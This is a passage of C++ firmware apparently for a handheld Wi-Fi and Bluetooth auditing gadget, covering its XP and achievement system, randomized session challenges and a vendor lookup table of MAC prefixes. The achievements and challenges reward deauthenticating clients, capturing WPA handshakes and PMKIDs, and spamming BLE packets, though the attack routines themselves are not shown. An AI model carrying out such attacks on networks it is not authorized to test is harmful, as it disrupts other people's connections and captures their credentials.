  if(_lNets>=1000)       unlockAchievement(ACH_WARDRIVER);
  if(_lNets>=5000)       unlockAchievement(ACH_SILICON_PSYCHO);
  if(_lNets>=10000)      unlockAchievement(ACH_TEN_THOUSAND);
  // Handshake achievements
  if(_lHS>=1)            unlockAchievement(ACH_FIRST_BLOOD);
  if(_lHS>=10)           unlockAchievement(ACH_HANDSHAKE_HAM);
  if(_lHS>=50)           unlockAchievement(ACH_FIFTY_SHAKES);
  if(_sessionHS>=3)      unlockAchievement(ACH_TRIPLE_THREAT);
  if(_sessionHS>=5)      unlockAchievement(ACH_HOT_STREAK);
  // PMKID achievements
  if(_lPMKID>=1)         unlockAchievement(ACH_PMKID_HUNTER);
  if(_lPMKID>=10)        unlockAchievement(ACH_PMKID_FIEND);
  // Deauth achievements
  if(_lDeauth>=1)        unlockAchievement(ACH_FIRST_DEAUTH);
  if(_lDeauth>=100)      unlockAchievement(ACH_DEAUTH_KING);
  if(_lDeauth>=1000)     unlockAchievement(ACH_DEAUTH_THOUSAND);
  if(_sessionDeauth>=10) unlockAchievement(ACH_RAMPAGE);
  // Session duration
  if(_sessions>=100)     unlockAchievement(ACH_SESSION_VET);
  if(sessionMs>=4UL*3600000UL) unlockAchievement(ACH_FOUR_HOUR_GRIND);
  // Speed run: 50 nets within 10 minutes of first net
  if (_sessionNets>=50 && _firstNetMs>0 && !hasAchievement(ACH_SPEED_RUN)) {
    if ((now - _firstNetMs) <= 600000UL) unlockAchievement(ACH_SPEED_RUN);
  }
  // Time-of-day achievements (require valid NTP time)
  {
    time_t t = time(nullptr);
    if (t > 1700000000UL) {
      struct tm* ti = localtime(&t);
      if (ti) {
        // Night owl: midnight–5am
        if (!_nightOwlAwarded && !hasAchievement(ACH_NIGHT_OWL)) {
          if (ti->tm_hour >= 0 && ti->tm_hour < 5) {
            unlockAchievement(ACH_NIGHT_OWL); _nightOwlAwarded = true;
          }
        }
        // Early bird: 5–7am
        if (!_earlyBirdAwarded && !hasAchievement(ACH_EARLY_BIRD)) {
          if (ti->tm_hour >= 5 && ti->tm_hour < 7) {
            unlockAchievement(ACH_EARLY_BIRD); _earlyBirdAwarded = true;
          }
        }
        // Weekend warrior: Saturday(6) or Sunday(0)
        if (!_weekendWarriorAwarded && !hasAchievement(ACH_WEEKEND_WARRIOR)) {
          if (ti->tm_wday == 0 || ti->tm_wday == 6) {
            unlockAchievement(ACH_WEEKEND_WARRIOR); _weekendWarriorAwarded = true;
          }
        }
      }
    }
  }
  // BLE achievements
  if(_bleTotal>=1000)    unlockAchievement(ACH_CHAOS_AGENT);
  if(_bleTotal>=5000)    unlockAchievement(ACH_BLE_BOMBER);
  if(_bleTotal>=10000)   unlockAchievement(ACH_OINKAGEDDON);
  // Level achievement
  if(_level>=50)         unlockAchievement(ACH_MAX_LEVEL);
}

void addBLECount(uint32_t n) { _bleTotal+=n; checkAchievements(); }
const char* getTitle() { return _level<=50 ? TITLES[_level-1] : "B4C0NM4NC3R"; }
uint8_t getProgress() {
  if (_level>=50) return 100;
  uint32_t cur=XP_THRESH[_level-1], nxt=XP_THRESH[_level];
  if (nxt<=cur) return 100;
  return (uint8_t)((_totalXP-cur)*100/(nxt-cur));
}
bool  shouldShowXP()  { return (millis()-_lastGainMs)<5000; }
uint16_t lastGainAmt(){ return _lastGainAmt; }
uint32_t getLifetimeNets()  { return _lNets; }
uint32_t getLifetimeHS()    { return _lHS; }
uint32_t getLifetimePMKID() { return _lPMKID; }

// Silent XP add — no toast, no level-up fanfare (used by Challenges rewards)
void addXPSilent(uint16_t amt) {
  if (!_inited) init();
  uint8_t oldL = _level;
  _totalXP += amt; _sessionXP += amt;
  _level = _calcLevel(_totalXP);
  if (_level > oldL) {
    char buf[40]; snprintf(buf,sizeof(buf),"LEVEL UP! LVL %d",_level);
    Display::showToast(buf, 3000);
    Avatar::cuteJump();
  }
}

} // namespace XP

// ============================================================
// CHALLENGES — session challenges, pig demands action
// Faithful port of src/core/challenges.cpp
// ============================================================

namespace Challenges {

static ActiveChallenge _ch[3]          = {};
static uint8_t         _activeCount    = 0;
static uint8_t         _deauthCount    = 0;
static portMUX_TYPE    _mux            = portMUX_INITIALIZER_UNLOCKED;

static uint16_t _clamp16(uint32_t v) { return v>0xFFFF ? 0xFFFF : (uint16_t)v; }

struct ChalTmpl {
  ChallengeType type; uint16_t easy; uint8_t medMult, hardMult;
  const char* fmt; uint8_t xpBase; bool needsGPS;
};
static const ChalTmpl POOL[] = {
  {ChallengeType::NETWORKS_FOUND,  25, 2, 4, "inhale %d nets",    15, false},
  {ChallengeType::NETWORKS_FOUND,  50, 2, 3, "discover %d APs",   25, false},
  {ChallengeType::HIDDEN_FOUND,     2, 2, 3, "expose %d hidden",  20, false},
  {ChallengeType::HANDSHAKES,       1, 2, 4, "snatch %d shakes",  40, false},
  {ChallengeType::HANDSHAKES,       2, 2, 3, "pwn %d targets",    50, false},
  {ChallengeType::PMKIDS,           1, 2, 3, "swipe %d PMKIDs",   50, false},
  {ChallengeType::DEAUTHS,          5, 3, 5, "drop %d deauths",   10, false},
  {ChallengeType::DEAUTHS,         10, 2, 4, "evict %d peasants", 15, false},
  {ChallengeType::GPS_NETWORKS,    15, 2, 4, "tag %d GPS nets",   20,  true},
  {ChallengeType::GPS_NETWORKS,    30, 2, 3, "geotag %d signals", 25,  true},
  {ChallengeType::BLE_PACKETS,     50, 3, 5, "spam %d BLE pkts",  15, false},
  {ChallengeType::BLE_PACKETS,    150, 2, 3, "serve %d BLE",      20, false},
  {ChallengeType::PASSIVE_NETWORKS,20, 2, 3, "lurk %d silently",  25, false},
  {ChallengeType::NO_DEAUTH_STREAK,15, 2, 3, "%d nets no deauth", 30, false},
  {ChallengeType::DISTANCE_M,     500, 2, 4, "trot %dm hunting",  20,  true},
  {ChallengeType::DISTANCE_M,    1000, 2, 3, "stomp %dm total",   25,  true},
  {ChallengeType::WPA3_FOUND,       1, 2, 4, "spot %d WPA3 nets", 15, false},
  {ChallengeType::OPEN_FOUND,       3, 2, 3, "find %d open nets", 15, false},
};
static const uint8_t POOL_SIZE = sizeof(POOL)/sizeof(POOL[0]);

bool isPigAwake() {
  return currentMode==PorkchopMode::OINK_MODE   ||
         currentMode==PorkchopMode::DNH_MODE    ||
         currentMode==PorkchopMode::WARHOG_MODE ||
         currentMode==PorkchopMode::PIGGYBLUES_MODE ||
         currentMode==PorkchopMode::SPECTRUM_MODE;
}

void reset() {
  portENTER_CRITICAL(&_mux);
  for(int i=0;i<3;i++) _ch[i]={};
  _activeCount=0; _deauthCount=0;
  portEXIT_CRITICAL(&_mux);
}

void generate() {
  reset();
  bool gpsOk = gpsHasFix;
  uint8_t picked[3]={0xFF,0xFF,0xFF};
  ChallengeType pickedTypes[3]={};

  for (int i=0; i<3; i++) {
    uint8_t idx=0; bool valid=false; int tries=0;
    do {
      idx=random(0,POOL_SIZE); valid=true;
      if (POOL[idx].needsGPS && !gpsOk) { valid=false; tries++; continue; }
      for(int j=0;j<i;j++) if(picked[j]==idx){valid=false;break;}
      if(valid) for(int j=0;j<i;j++) if(pickedTypes[j]==POOL[idx].type){valid=false;break;}
      tries++;
    } while(!valid && tries<50);
    if(!valid) { for(uint8_t j=0;j<POOL_SIZE;j++){if(!POOL[j].needsGPS||gpsOk){idx=j;valid=true;break;}} }
    if(!valid) idx=0;

    picked[i]=idx; pickedTypes[i]=POOL[idx].type;
    ChallengeDifficulty diff=static_cast<ChallengeDifficulty>(i);
    const ChalTmpl& t=POOL[idx];

    uint16_t target=t.easy;
    if(diff==ChallengeDifficulty::MEDIUM) target=_clamp16((uint32_t)target*t.medMult);
    else if(diff==ChallengeDifficulty::HARD) target=_clamp16((uint32_t)target*t.hardMult);
    uint8_t lvl=XP::getLevel();
    if(lvl>=31) target=_clamp16((uint32_t)target*3);
    else if(lvl>=21) target=_clamp16((uint32_t)target*2);
    else if(lvl>=11) target=_clamp16(((uint32_t)target*3)/2);

    uint16_t reward=t.xpBase;
    if(diff==ChallengeDifficulty::MEDIUM) reward=_clamp16((uint32_t)reward*2);
    else if(diff==ChallengeDifficulty::HARD) reward=_clamp16((uint32_t)reward*4);
    if(lvl>=31) reward=_clamp16((uint32_t)reward*3);
    else if(lvl>=21) reward=_clamp16((uint32_t)reward*2);
    else if(lvl>=11) reward=_clamp16(((uint32_t)reward*3)/2);

    portENTER_CRITICAL(&_mux);
    _ch[i].type=t.type; _ch[i].difficulty=diff;
    _ch[i].target=target; _ch[i].progress=0;
    _ch[i].xpReward=reward; _ch[i].completed=false; _ch[i].failed=false;
    snprintf(_ch[i].name,sizeof(_ch[i].name),t.fmt,target);
    portEXIT_CRITICAL(&_mux);
  }
  portENTER_CRITICAL(&_mux); _activeCount=3; _deauthCount=0; portEXIT_CRITICAL(&_mux);

  Serial.println("[CHALLENGES] pig wakes. three trials await.");
  for(int i=0;i<3;i++){
    const char* d=(i==0)?"EASY":(i==1)?"MEDIUM":"HARD";
    portENTER_CRITICAL(&_mux);
    char n[32]; strncpy(n,_ch[i].name,sizeof(n)-1); n[31]=0;
    uint16_t tgt=_ch[i].target, xp=_ch[i].xpReward;
    portEXIT_CRITICAL(&_mux);
    Serial.printf("[CHALLENGES]  %s: %s (target=%d, +%dxp)\n",d,n,tgt,xp);
  }
}

bool getSnapshot(uint8_t idx, ActiveChallenge& out) {
  if(idx>=3) return false;
  portENTER_CRITICAL(&_mux);
  if(idx>=_activeCount){portEXIT_CRITICAL(&_mux);return false;}
  out=_ch[idx];
  portEXIT_CRITICAL(&_mux);
  return true;
}
uint8_t getActiveCount()    { portENTER_CRITICAL(&_mux); uint8_t c=_activeCount; portEXIT_CRITICAL(&_mux); return c; }
uint8_t getCompletedCount() {
  uint8_t c=0;
  portENTER_CRITICAL(&_mux);
  for(int i=0;i<_activeCount;i++) if(_ch[i].completed) c++;
  portEXIT_CRITICAL(&_mux);
  return c;
}
bool allCompleted() {
  portENTER_CRITICAL(&_mux);
  if(!_activeCount){portEXIT_CRITICAL(&_mux);return false;}
  for(int i=0;i<_activeCount;i++) if(!_ch[i].completed){portEXIT_CRITICAL(&_mux);return false;}
  portEXIT_CRITICAL(&_mux);
  return true;
}

static void _failConditional(ChallengeType type) {
  char nm[32]={};  bool logged=false;
  portENTER_CRITICAL(&_mux);
  for(int i=0;i<_activeCount;i++){
    if(_ch[i].type==type && !_ch[i].completed && !_ch[i].failed){
      _ch[i].failed=true;
      if(!logged){strncpy(nm,_ch[i].name,31);logged=true;}
    }
  }
  portEXIT_CRITICAL(&_mux);
  if(logged) Serial.printf("[CHALLENGES] '%s' failed. violence detected.\n",nm);
}

static void _updateProgress(ChallengeType type, uint16_t delta) {
  struct Notice { ChallengeDifficulty diff; uint16_t xp; char name[32]; };
  Notice notices[3]={}; uint8_t nCount=0; bool sweep=false;

  portENTER_CRITICAL(&_mux);
  for(int i=0;i<_activeCount;i++){
    ActiveChallenge& c=_ch[i];
    if(c.type!=type||c.completed||c.failed) continue;
    uint32_t np=(uint32_t)c.progress+delta;
    c.progress=(np>0xFFFF)?0xFFFF:(uint16_t)np;
    if(c.progress>=c.target){
      c.completed=true; c.progress=c.target;
      if(nCount<3){
        notices[nCount].diff=c.difficulty;
        notices[nCount].xp=c.xpReward;
        strncpy(notices[nCount].name,c.name,31);
        nCount++;
      }
    }
  }
  if(nCount>0){
    sweep=true;
    for(int i=0;i<_activeCount;i++) if(!_ch[i].completed){sweep=false;break;}
  }
  portEXIT_CRITICAL(&_mux);

  for(uint8_t i=0;i<nCount;i++){
    XP::addXPSilent(notices[i].xp);
    const char* msg;
    switch(notices[i].diff){
      case ChallengeDifficulty::EASY:   msg="FIRST BLOOD. PIG STIRS.";      break;
      case ChallengeDifficulty::MEDIUM: msg="PROGRESS NOTED. PIG LISTENS."; break;
      case ChallengeDifficulty::HARD:   msg="BRUTAL. PIG RESPECTS.";        break;
      default:                          msg="PIG APPROVES.";                 break;
    }
    Display::showToast(msg);
    Serial.printf("[CHALLENGES] pig pleased. '%s' +%d XP.\n",notices[i].name,notices[i].xp);
  }
  if(sweep){
    uint16_t bonus=50+(XP::getLevel()*3);
    XP::addXPSilent(bonus);
    Display::showToast("WORTHY. 115200 REMEMBERS.");
    Serial.printf("[CHALLENGES] *** FULL SWEEP! +%d BONUS XP ***\n",bonus);
  }
}

void onXPEvent(XPEvent event) {
  if(!isPigAwake()) return;
  uint8_t deauthSnap=0, localActive=0;
  portENTER_CRITICAL(&_mux);
  localActive=_activeCount; deauthSnap=_deauthCount;
  portEXIT_CRITICAL(&_mux);
  if(!localActive) return;

  switch(event){
    case XPEvent::NETWORK_FOUND:
      _updateProgress(ChallengeType::NETWORKS_FOUND,1);
      if(deauthSnap<2) _updateProgress(ChallengeType::NO_DEAUTH_STREAK,1);
      break;
    case XPEvent::NETWORK_HIDDEN:
      _updateProgress(ChallengeType::NETWORKS_FOUND,1);
      _updateProgress(ChallengeType::HIDDEN_FOUND,1);
      if(deauthSnap<2) _updateProgress(ChallengeType::NO_DEAUTH_STREAK,1);
      break;
    case XPEvent::NETWORK_WPA3:
      _updateProgress(ChallengeType::NETWORKS_FOUND,1);
      _updateProgress(ChallengeType::WPA3_FOUND,1);
      if(deauthSnap<2) _updateProgress(ChallengeType::NO_DEAUTH_STREAK,1);
      break;
    case XPEvent::NETWORK_OPEN:
      _updateProgress(ChallengeType::NETWORKS_FOUND,1);
      _updateProgress(ChallengeType::OPEN_FOUND,1);
      if(deauthSnap<2) _updateProgress(ChallengeType::NO_DEAUTH_STREAK,1);
      break;
    case XPEvent::NETWORK_WEP:
      _updateProgress(ChallengeType::NETWORKS_FOUND,1);
      if(deauthSnap<2) _updateProgress(ChallengeType::NO_DEAUTH_STREAK,1);
      break;
    case XPEvent::HANDSHAKE_CAPTURED:
      _updateProgress(ChallengeType::HANDSHAKES,1); break;
    case XPEvent::PMKID_CAPTURED:
    case XPEvent::DNH_PMKID_GHOST:
      _updateProgress(ChallengeType::PMKIDS,1); break;
    case XPEvent::DEAUTH_SENT:
      _updateProgress(ChallengeType::DEAUTHS,1);
      if(deauthSnap<2){
        bool shouldFail=false;
        portENTER_CRITICAL(&_mux); _deauthCount++;
        if(_deauthCount>=2) shouldFail=true;
        portEXIT_CRITICAL(&_mux);
        if(shouldFail) _failConditional(ChallengeType::NO_DEAUTH_STREAK);
      }
      break;
    case XPEvent::WARHOG_LOGGED:
      _updateProgress(ChallengeType::GPS_NETWORKS,1); break;
    case XPEvent::DISTANCE_KM:
      _updateProgress(ChallengeType::DISTANCE_M,1000); break;
    case XPEvent::BLE_APPLE:
    case XPEvent::BLE_ANDROID:
    case XPEvent::BLE_SAMSUNG:
    case XPEvent::BLE_WINDOWS:
      _updateProgress(ChallengeType::BLE_PACKETS,1); break;
    case XPEvent::DNH_NETWORK_PASSIVE:
      _updateProgress(ChallengeType::PASSIVE_NETWORKS,1);
      _updateProgress(ChallengeType::NETWORKS_FOUND,1);
      if(deauthSnap<2) _updateProgress(ChallengeType::NO_DEAUTH_STREAK,1);
      break;
    default: break;
  }
}

} // namespace Challenges

// ============================================================
// OUI LOOKUP — vendor identification from MAC prefix
// Faithful port of src/core/oui.cpp
// PROGMEM table — zero heap cost, ~457 entries
// ============================================================

namespace OUI {

struct OUIEntry { uint8_t oui[3]; char vendor[10]; };

static const OUIEntry OUI_TABLE[] PROGMEM = {
  // Apple
  {{0x00,0x03,0x93},"Apple"},  {{0x00,0x0A,0x27},"Apple"},
  {{0x00,0x0A,0x95},"Apple"},  {{0x00,0x0D,0x93},"Apple"},
  {{0x00,0x10,0xFA},"Apple"},  {{0x00,0x11,0x24},"Apple"},
  {{0x00,0x14,0x51},"Apple"},  {{0x00,0x16,0xCB},"Apple"},
  {{0x00,0x17,0xF2},"Apple"},  {{0x00,0x19,0xE3},"Apple"},
  {{0x00,0x1B,0x63},"Apple"},  {{0x00,0x1C,0xB3},"Apple"},
  {{0x00,0x1D,0x4F},"Apple"},  {{0x00,0x1E,0x52},"Apple"},
  {{0x00,0x1E,0xC2},"Apple"},  {{0x00,0x1F,0x5B},"Apple"},
  {{0x00,0x1F,0xF3},"Apple"},  {{0x00,0x21,0xE9},"Apple"},
  {{0x00,0x22,0x41},"Apple"},  {{0x00,0x23,0x12},"Apple"},
  {{0x00,0x23,0x32},"Apple"},  {{0x00,0x23,0x6C},"Apple"},
  {{0x00,0x23,0xDF},"Apple"},  {{0x00,0x24,0x36},"Apple"},
  {{0x00,0x25,0x00},"Apple"},  {{0x00,0x25,0x4B},"Apple"},
  {{0x00,0x25,0xBC},"Apple"},  {{0x00,0x26,0x08},"Apple"},
  {{0x00,0x26,0x4A},"Apple"},  {{0x00,0x26,0xB0},"Apple"},
  {{0x00,0x26,0xBB},"Apple"},
  // Samsung
  {{0x00,0x00,0xF0},"Samsung"}, {{0x00,0x02,0x78},"Samsung"},
  {{0x00,0x07,0xAB},"Samsung"}, {{0x00,0x09,0x18},"Samsung"},
  {{0x00,0x0D,0xAE},"Samsung"}, {{0x00,0x0D,0xE5},"Samsung"},
  {{0x00,0x12,0x47},"Samsung"}, {{0x00,0x12,0xFB},"Samsung"},
  {{0x00,0x13,0x77},"Samsung"}, {{0x00,0x15,0x99},"Samsung"},
  {{0x00,0x15,0xB9},"Samsung"}, {{0x00,0x16,0x32},"Samsung"},
  {{0x00,0x16,0x6B},"Samsung"}, {{0x00,0x16,0x6C},"Samsung"},
  {{0x00,0x16,0xDB},"Samsung"}, {{0x00,0x17,0xC9},"Samsung"},
  {{0x00,0x17,0xD5},"Samsung"}, {{0x00,0x18,0xAF},"Samsung"},
  {{0x00,0x1A,0x8A},"Samsung"}, {{0x00,0x1B,0x98},"Samsung"},
  {{0x00,0x1C,0x43},"Samsung"}, {{0x00,0x1D,0x25},"Samsung"},
  {{0x00,0x1D,0xF6},"Samsung"}, {{0x00,0x1E,0x7D},"Samsung"},
  {{0x00,0x1E,0xE1},"Samsung"}, {{0x00,0x1E,0xE2},"Samsung"},
  {{0x00,0x1F,0xCC},"Samsung"}, {{0x00,0x1F,0xCD},"Samsung"},
  {{0x00,0x21,0x19},"Samsung"}, {{0x00,0x21,0x4C},"Samsung"},
  {{0x00,0x21,0xD1},"Samsung"}, {{0x00,0x21,0xD2},"Samsung"},
  {{0x00,0x23,0x39},"Samsung"}, {{0x00,0x23,0x99},"Samsung"},
  {{0x00,0x23,0xD6},"Samsung"}, {{0x00,0x23,0xD7},"Samsung"},
  {{0x00,0x24,0x54},"Samsung"}, {{0x00,0x24,0x90},"Samsung"},
  {{0x00,0x24,0x91},"Samsung"}, {{0x00,0x25,0x66},"Samsung"},
  {{0x00,0x25,0x67},"Samsung"}, {{0x00,0x26,0x37},"Samsung"},
  {{0x00,0x26,0x5D},"Samsung"}, {{0x00,0x26,0x5F},"Samsung"},
  // Google/Nest
  {{0x00,0x1A,0x11},"Google"},  {{0x18,0xD6,0xC7},"Google"},
  {{0x1C,0xF2,0x9A},"Google"},  {{0x20,0xDF,0xB9},"Google"},
  {{0x30,0xFD,0x38},"Google"},  {{0x3C,0x5A,0xB4},"Google"},
  {{0x54,0x60,0x09},"Google"},  {{0x58,0xCB,0x52},"Google"},
  {{0x94,0xEB,0x2C},"Google"},  {{0xA4,0x77,0x33},"Google"},
  {{0xD8,0x6C,0x63},"Google"},  {{0xF4,0xF5,0xD8},"Google"},
  {{0xF4,0xF5,0xE8},"Google"},
  // Intel
  {{0x00,0x02,0xB3},"Intel"},   {{0x00,0x03,0x47},"Intel"},
  {{0x00,0x04,0x23},"Intel"},   {{0x00,0x07,0xE9},"Intel"},
  {{0x00,0x0C,0xF1},"Intel"},   {{0x00,0x0E,0x0C},"Intel"},
  {{0x00,0x0E,0x35},"Intel"},   {{0x00,0x11,0x11},"Intel"},
  {{0x00,0x12,0xF0},"Intel"},   {{0x00,0x13,0x02},"Intel"},
  {{0x00,0x13,0x20},"Intel"},   {{0x00,0x13,0xCE},"Intel"},
  {{0x00,0x13,0xE8},"Intel"},   {{0x00,0x15,0x00},"Intel"},
  {{0x00,0x15,0x17},"Intel"},   {{0x00,0x16,0x6F},"Intel"},
  {{0x00,0x16,0x76},"Intel"},   {{0x00,0x16,0xEA},"Intel"},
  {{0x00,0x16,0xEB},"Intel"},   {{0x00,0x18,0xDE},"Intel"},
  {{0x00,0x19,0xD1},"Intel"},   {{0x00,0x19,0xD2},"Intel"},
  {{0x00,0x1B,0x21},"Intel"},   {{0x00,0x1B,0x77},"Intel"},
  {{0x00,0x1C,0xBF},"Intel"},   {{0x00,0x1C,0xC0},"Intel"},
  {{0x00,0x1D,0xE0},"Intel"},   {{0x00,0x1D,0xE1},"Intel"},
  {{0x00,0x1E,0x64},"Intel"},   {{0x00,0x1E,0x65},"Intel"},
  {{0x00,0x1E,0x67},"Intel"},   {{0x00,0x1F,0x3B},"Intel"},
  {{0x00,0x1F,0x3C},"Intel"},   {{0x00,0x20,0xA6},"Intel"},
  {{0x00,0x21,0x5C},"Intel"},   {{0x00,0x21,0x5D},"Intel"},
  {{0x00,0x21,0x6A},"Intel"},   {{0x00,0x21,0x6B},"Intel"},
  {{0x00,0x22,0xFA},"Intel"},   {{0x00,0x22,0xFB},"Intel"},
  {{0x00,0x24,0xD6},"Intel"},   {{0x00,0x24,0xD7},"Intel"},
  {{0x00,0x26,0xC6},"Intel"},   {{0x00,0x26,0xC7},"Intel"},
  // Cisco/Linksys
  {{0x00,0x00,0x0C},"Cisco"},   {{0x00,0x01,0x42},"Cisco"},
  {{0x00,0x01,0x43},"Cisco"},   {{0x00,0x01,0x63},"Cisco"},
  {{0x00,0x01,0x64},"Cisco"},   {{0x00,0x01,0x96},"Cisco"},
  {{0x00,0x01,0x97},"Cisco"},   {{0x00,0x01,0xC7},"Cisco"},
  {{0x00,0x01,0xC9},"Cisco"},   {{0x00,0x02,0x16},"Cisco"},
  {{0x00,0x02,0x17},"Cisco"},   {{0x00,0x02,0x3D},"Cisco"},
  {{0x00,0x02,0x4A},"Cisco"},   {{0x00,0x02,0x4B},"Cisco"},
  {{0x00,0x02,0x7D},"Cisco"},   {{0x00,0x02,0x7E},"Cisco"},
  {{0x00,0x02,0xB9},"Cisco"},   {{0x00,0x02,0xBA},"Cisco"},
  {{0x00,0x02,0xFC},"Cisco"},   {{0x00,0x02,0xFD},"Cisco"},
  // Huawei
  {{0x00,0x0F,0xE2},"Huawei"},  {{0x00,0x18,0x82},"Huawei"},
  {{0x00,0x1E,0x10},"Huawei"},  {{0x00,0x22,0xA1},"Huawei"},
  {{0x00,0x25,0x68},"Huawei"},  {{0x00,0x25,0x9E},"Huawei"},
  {{0x00,0x34,0xFE},"Huawei"},  {{0x00,0x46,0x4B},"Huawei"},
  {{0x00,0x66,0x4B},"Huawei"},  {{0x00,0x9A,0xCD},"Huawei"},
  {{0x00,0xE0,0xFC},"Huawei"},  {{0x04,0x02,0x1F},"Huawei"},
  {{0x04,0xB0,0xE7},"Huawei"},  {{0x04,0xC0,0x6F},"Huawei"},
  {{0x04,0xF9,0x38},"Huawei"},  {{0x08,0x19,0xA6},"Huawei"},
  {{0x08,0x63,0x61},"Huawei"},  {{0x08,0x7A,0x4C},"Huawei"},
  {{0x08,0xE8,0x4F},"Huawei"},
  // Microsoft/Xbox
  {{0x00,0x03,0xFF},"Microsoft"},{{0x00,0x0D,0x3A},"Microsoft"},
  {{0x00,0x12,0x5A},"Microsoft"},{{0x00,0x15,0x5D},"Microsoft"},
  {{0x00,0x17,0xFA},"Microsoft"},{{0x00,0x1D,0xD8},"Microsoft"},
  {{0x00,0x22,0x48},"Microsoft"},{{0x00,0x25,0xAE},"Microsoft"},
  {{0x00,0x50,0xF2},"Microsoft"},{{0x28,0x18,0x78},"Microsoft"},
  {{0x30,0x59,0xB7},"Microsoft"},{{0x50,0x1A,0xC5},"Microsoft"},
  {{0x60,0x45,0xBD},"Microsoft"},{{0x7C,0x1E,0x52},"Microsoft"},
  {{0x7C,0xED,0x8D},"Microsoft"},
  // Amazon
  {{0x00,0xFC,0x8B},"Amazon"},  {{0x0C,0x47,0xC9},"Amazon"},
  {{0x10,0xCE,0xA9},"Amazon"},  {{0x18,0x74,0x2E},"Amazon"},
  {{0x34,0xD2,0x70},"Amazon"},  {{0x38,0xF7,0x3D},"Amazon"},
  {{0x40,0xB4,0xCD},"Amazon"},  {{0x44,0x65,0x0D},"Amazon"},
  {{0x4C,0xEF,0xC0},"Amazon"},  {{0x50,0xDC,0xE7},"Amazon"},
  {{0x5C,0x41,0x5A},"Amazon"},  {{0x68,0x37,0xE9},"Amazon"},
  {{0x68,0x54,0xFD},"Amazon"},  {{0x74,0xC2,0x46},"Amazon"},
  {{0x78,0xE1,0x03},"Amazon"},  {{0x84,0xD6,0xD0},"Amazon"},
  {{0xA0,0x02,0xDC},"Amazon"},  {{0xAC,0x63,0xBE},"Amazon"},
  {{0xB4,0x7C,0x9C},"Amazon"},  {{0xB8,0x6C,0xE4},"Amazon"},
  {{0xF0,0x27,0x2D},"Amazon"},  {{0xFC,0x65,0xDE},"Amazon"},
  // TP-Link
  {{0x00,0x1D,0x0F},"TP-Link"}, {{0x00,0x27,0x19},"TP-Link"},
  {{0x10,0xFE,0xED},"TP-Link"}, {{0x14,0xCC,0x20},"TP-Link"},
  {{0x14,0xCF,0x92},"TP-Link"}, {{0x18,0xA6,0xF7},"TP-Link"},
  {{0x1C,0x3B,0xF3},"TP-Link"}, {{0x30,0xB4,0x9E},"TP-Link"},
  {{0x50,0xC7,0xBF},"TP-Link"}, {{0x54,0xC8,0x0F},"TP-Link"},
  {{0x5C,0x89,0x9A},"TP-Link"}, {{0x60,0xE3,0x27},"TP-Link"},
  {{0x64,0x56,0x01},"TP-Link"}, {{0x64,0x70,0x02},"TP-Link"},
  {{0x6C,0xB0,0xCE},"TP-Link"}, {{0x78,0x44,0x76},"TP-Link"},
  {{0x90,0xF6,0x52},"TP-Link"}, {{0x98,0xDE,0xD0},"TP-Link"},
  {{0xA4,0x2B,0xB0},"TP-Link"}, {{0xAC,0x84,0xC6},"TP-Link"},
  {{0xB0,0x4E,0x26},"TP-Link"}, {{0xB0,0xBE,0x76},"TP-Link"},
  {{0xC0,0x25,0xE9},"TP-Link"}, {{0xC4,0xE9,0x84},"TP-Link"},
  {{0xD8,0x07,0xB6},"TP-Link"}, {{0xE8,0x94,0xF6},"TP-Link"},
  {{0xEC,0x08,0x6B},"TP-Link"}, {{0xF4,0xEC,0x38},"TP-Link"},
  {{0xF8,0x1A,0x67},"TP-Link"},
  // Netgear
  {{0x00,0x09,0x5B},"Netgear"}, {{0x00,0x0F,0xB5},"Netgear"},
  {{0x00,0x14,0x6C},"Netgear"}, {{0x00,0x18,0x4D},"Netgear"},
  {{0x00,0x1B,0x2F},"Netgear"}, {{0x00,0x1E,0x2A},"Netgear"},
  {{0x00,0x1F,0x33},"Netgear"}, {{0x00,0x22,0x3F},"Netgear"},
  {{0x00,0x24,0xB2},"Netgear"}, {{0x00,0x26,0xF2},"Netgear"},
  {{0x20,0x4E,0x7F},"Netgear"}, {{0x28,0xC6,0x8E},"Netgear"},
  {{0x30,0x46,0x9A},"Netgear"}, {{0x44,0x94,0xFC},"Netgear"},
  {{0x4C,0x60,0xDE},"Netgear"}, {{0x84,0x1B,0x5E},"Netgear"},
  {{0x9C,0x3D,0xCF},"Netgear"}, {{0xA0,0x04,0x60},"Netgear"},
  {{0xA4,0x2B,0x8C},"Netgear"}, {{0xC0,0x3F,0x0E},"Netgear"},
  {{0xC4,0x04,0x15},"Netgear"}, {{0xE0,0x46,0x9A},"Netgear"},
  {{0xE4,0xF4,0xC6},"Netgear"},
  // Xiaomi
  {{0x00,0x9E,0xC8},"Xiaomi"},  {{0x04,0xCF,0x8C},"Xiaomi"},
  {{0x0C,0x1D,0xAF},"Xiaomi"},  {{0x10,0x2A,0xB3},"Xiaomi"},
  {{0x14,0xF6,0x5A},"Xiaomi"},  {{0x18,0x59,0x36},"Xiaomi"},
  {{0x20,0x34,0xFB},"Xiaomi"},  {{0x28,0x6C,0x07},"Xiaomi"},
  {{0x34,0x80,0xB3},"Xiaomi"},  {{0x38,0xA4,0xED},"Xiaomi"},
  {{0x3C,0xBD,0x3E},"Xiaomi"},  {{0x50,0x64,0x2B},"Xiaomi"},
  {{0x58,0x44,0x98},"Xiaomi"},  {{0x64,0x09,0x80},"Xiaomi"},
  {{0x64,0xB4,0x73},"Xiaomi"},  {{0x68,0xDF,0xDD},"Xiaomi"},
  {{0x74,0x23,0x44},"Xiaomi"},  {{0x78,0x02,0xF8},"Xiaomi"},
  {{0x78,0x11,0xDC},"Xiaomi"},  {{0x7C,0x1D,0xD9},"Xiaomi"},
  {{0x84,0x24,0x8D},"Xiaomi"},  {{0x8C,0xBE,0xBE},"Xiaomi"},
  {{0x98,0xFA,0xE3},"Xiaomi"},  {{0xA8,0x9C,0xED},"Xiaomi"},
  {{0xAC,0xF7,0xF3},"Xiaomi"},  {{0xB0,0xE2,0x35},"Xiaomi"},
  {{0xC4,0x0B,0xCB},"Xiaomi"},  {{0xC8,0x02,0x8F},"Xiaomi"},
  {{0xD4,0x97,0x0B},"Xiaomi"},  {{0xE4,0x46,0xDA},"Xiaomi"},
  {{0xF0,0xB4,0x29},"Xiaomi"},  {{0xF8,0xA4,0x5F},"Xiaomi"},
  {{0xFC,0x64,0xBA},"Xiaomi"},
  // Sony
  {{0x00,0x01,0x4A},"Sony"},    {{0x00,0x04,0x1F},"Sony"},
  {{0x00,0x13,0xA9},"Sony"},    {{0x00,0x15,0xC1},"Sony"},
  {{0x00,0x19,0x63},"Sony"},    {{0x00,0x19,0xC5},"Sony"},
  {{0x00,0x1A,0x80},"Sony"},    {{0x00,0x1D,0x0D},"Sony"},
